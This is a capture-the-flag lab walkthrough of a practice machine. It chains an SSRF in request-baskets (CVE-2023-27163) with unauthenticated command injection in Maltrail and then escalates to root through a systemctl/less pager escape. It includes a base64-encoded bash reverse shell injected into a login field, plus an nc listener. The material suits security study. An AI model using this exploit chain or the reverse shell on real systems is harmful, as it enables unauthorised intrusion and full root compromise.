## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -p- -oN nmap/full 10.10.11.224
```

```text
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
```

Key findings:
- Port 80 and 8338 are **filtered** — not directly accessible
- Port 55555 is open and serves an unknown web application

### Web Enumeration (Port 55555)

Navigating to `http://10.10.11.224:55555` reveals **request-baskets v1.2.1**, a web application for collecting and inspecting HTTP requests.

Researching this version identifies **CVE-2023-27163**, a Server-Side Request Forgery (SSRF) vulnerability that allows an attacker to access internal services through crafted basket configurations.

## Foothold

### SSRF via request-baskets (CVE-2023-27163)

The SSRF vulnerability allows us to configure a basket to forward requests to an internal service. Since port 80 is filtered externally, we can use the SSRF to reach it.

**Step 1:** Create a new basket via the API.

```bash
curl -X POST http://10.10.11.224:55555/api/baskets/pwned \
  -H 'Content-Type: application/json' \
  -d '{
    "forward_url": "http://127.0.0.1:80",
    "proxy_response": true,
    "insecure_tls": false,
    "expand_path": true,
    "capacity": 250
  }'
```

**Step 2:** Access the basket URL to reach the internal service.

```bash
curl http://10.10.11.224:55555/pwned
```

This reveals **Maltrail v0.53** running on the internal port 80.

### RCE via Maltrail (Unauthenticated OS Command Injection)

Maltrail v0.53 is vulnerable to unauthenticated OS command injection in the login page's `username` parameter.

**Step 3:** Start a listener.

```bash
nc -lvnp 4444
```

**Step 4:** Exploit the command injection through the SSRF chain.

```bash
curl http://10.10.11.224:55555/pwned/login \
  --data "username=;$(echo+'YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yLzQ0NDQgMD4mMQ=='|base64+-d|bash)"
```

The base64 payload decodes to a standard bash reverse shell.

Result:

```text
$ whoami
puma
$ cat /home/puma/user.txt
[REDACTED]
```

## Privilege Escalation

### Enumeration

```bash
sudo -l
```

```text
User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

The user `puma` can run `systemctl status` as root without a password.

### Exploiting systemctl Pager

When `systemctl status` output exceeds the terminal height, it invokes the default pager (usually `less`). Since `less` is running as root, we can escape to a root shell.

**Step 1:** Run the command with sudo.

```bash
sudo /usr/bin/systemctl status trail.service
```

**Step 2:** When the `less` pager appears, type:

```text
!sh
```

This drops into a root shell.

### Root Flag

```bash
whoami
# root
cat /root/root.txt
# [REDACTED]
```

## Lessons Learned

- **What worked:** Systematic enumeration of all ports revealed the unusual port 55555. Recognizing filtered ports as potential SSRF targets was the key insight.
- **What I learned:** SSRF can be chained with internal service vulnerabilities to achieve RCE, even when the vulnerable service is not directly exposed. The `systemctl` → `less` pager escape is a useful sudo privesc technique.
- **Tools used:** Nmap, curl, Netcat
